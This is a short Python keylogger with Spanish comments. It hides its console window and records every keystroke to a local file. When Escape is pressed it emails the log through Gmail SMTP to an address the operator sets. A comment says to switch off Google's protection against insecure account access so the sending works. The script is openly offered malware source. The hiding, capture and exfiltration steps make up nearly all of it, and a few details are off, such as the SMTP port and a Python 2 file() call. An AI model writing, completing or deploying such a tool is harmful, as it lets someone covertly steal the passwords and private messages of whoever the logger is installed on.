import pynput.keyboard
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import win32console
import win32gui
"""
Para el correo permita enviar desde esta aplicacion es necesario desactivar la funcion de google
para restrigir los usos inseguros de la cuenta en:
google.account/segurity
"""
ventana = win32console.GetConsoleWindow()
win32gui.ShowWindow(ventana,0)

teclas = []
log_file = open('logs.txt', 'w+')

def enviar():
    msg = MIMEMultipart()
    password = "Contraseña de gmail aqui"
    msg['From']="Correo electronico aqui"
    msg['To'] = "Correo electronico a enviar"
    msg['Subject'] = "Keylogger"
    msg.attach(MIMEText(file('logs.txt').read()))
    try:
        server = smtplib.SMTP('smtp.gmail.com:857')
        server.starttls()
        server.login(msg['From'], password)
        server.sendmail(msg['From'], msg['To'], msg.as_string())
        server.quit()
    except:
        pass


def tecla(key):
    tecla = convertir(key)
    if tecla == "Key.esc":
        imprimir()
        return False
    elif tecla == "Key.space":
        teclas.append(" ")
    elif tecla == "Key.backspace":
        pass
    else:
        teclas.append(tecla)

def imprimir():
    log_file.write(''.join(teclas))
    log_file.write('\n')
    log_file.close()
    time.sleep(3)
    enviar()
def convertir(key):
    if isinstance(key, pynput.keyboard.KeyCode):
        return key.char
    else:
        return str(key)

with pynput.keyboard.Listener(on_press=tecla) as listen:
    listen.join()

